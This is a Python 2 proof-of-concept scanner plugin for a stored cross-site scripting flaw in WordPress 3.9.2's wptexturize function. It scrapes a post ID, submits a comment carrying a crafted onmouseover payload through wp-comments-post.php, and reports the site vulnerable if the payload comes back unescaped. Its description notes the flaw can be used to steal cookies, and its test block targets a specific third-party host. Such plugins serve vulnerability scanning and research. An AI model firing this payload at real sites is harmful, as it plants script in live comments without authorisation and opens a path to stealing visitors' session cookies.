#!/usr/bin/python2.7
#coding:utf-8

import re
import random
import string
import requests
from dummy import *

info = {
	'NAME':'Wordpress 3.9.2 /wp-includes/formatting.php XSS',
	'AUTHOR':'flsf,yangbh',
	'TIME':'20141205',
	'WEB':'http://www.beebeeto.com/pdb/poc-2014-0167/',
	'DESCRIPTION':'/wp-includes/formatting.php 中 wptexturize 函数在处理标签时过滤不严导致双引号重组绕过，最终导致 XSS 漏洞,可以获取 Cookie。'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Wordpress':
			if (services.has_key('cmsversion') and services['cmsversion'] <'4.0' and services['cmsversion'] >'3.0') or services.has_key('cmsversion')==False:
				return True
	return False

def Audit(services):
	retinfo = None
	output = ''

	url = services['url']
	verify_url = url + "/wp-comments-post.php"

	print '[*] Request URL: ' + verify_url

	rand_str = lambda length: ''.join(random.sample(string.letters, length))
	try:
		post_id = re.search(r'post-(?P<post_id>[\d]+)', requests.get(url).content).group('post_id')
		print 'post_id=',post_id
	except Exception,e:
		print 'Exception',e
		return (None,None)
	flag = rand_str(10)
	payload = {
		'author': rand_str(10),
		'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
		'url': '',
		'comment': '[<a href="xxx" title="]"></a>[" <!-- onmouseover="alert(/moemoe/)"><!-- -->%s<a></a>]"' % flag,
		'comment_post_ID': post_id,
		'comment_parent': 0,
	}

	content = requests.post(verify_url, data=payload).content
	# print content

	if 'onmouseover="alert(/moemoe/)"><!-- -->%s' % flag in content:
		security_warning(url)
		output = 'Vuln'

	return (retinfo,output)

# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	url='http://mdxjj.sinaapp.com'
	if len(sys.argv) ==  2:
		url = sys.argv[1]
	services = {'url':url}
	pprint(Audit(services))
	pprint(services)